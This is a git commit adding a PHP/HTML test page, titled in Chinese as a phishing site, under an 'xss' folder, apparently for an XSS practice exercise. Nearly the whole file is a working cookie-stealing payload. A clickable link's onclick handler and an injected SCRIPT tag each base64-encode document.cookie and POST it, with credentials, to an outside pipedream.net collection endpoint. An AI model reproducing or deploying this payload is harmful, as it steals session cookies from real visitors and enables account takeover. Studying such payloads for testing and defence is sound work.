27eb1db4cca622f7a9abee36bb3dffbf05f4e84d
Vincent550102 <5020559@gmail.com>
2021-04-17 23:00:15 +0800

    upd

---
+++ testfile/xss/server.php
@@ -0,0 +1,12 @@
+<head>
+    <title>我是釣魚網站</title>
+</head>
+
+<body>
+
+<a onclick = "javascript:fetch('https://enhvqtp2mx74kfr.m.pipedream.net', {     method: 'POST',     body: window.btoa(document.cookie),     cache: 'no-cache',     credentials: 'include',     headers: { 'content-type': 'application/x-www-form-urlencoded'     },     mode: 'no-cors' });" >可愛蛇蛇已幫你點擊：）</a>
+
+<img src='https://cdn2.ettoday.net/images/867/d867907.jpg'>
+<IMG “””><SCRIPT>fetch('https://enhvqtp2mx74kfr.m.pipedream.net', {     method: 'POST',     body: window.btoa(document.cookie),     cache: 'no-cache',     credentials: 'include',     headers: { 'content-type': 'application/x-www-form-urlencoded'     },     mode: 'no-cors' });</SCRIPT>">
+
+</body>
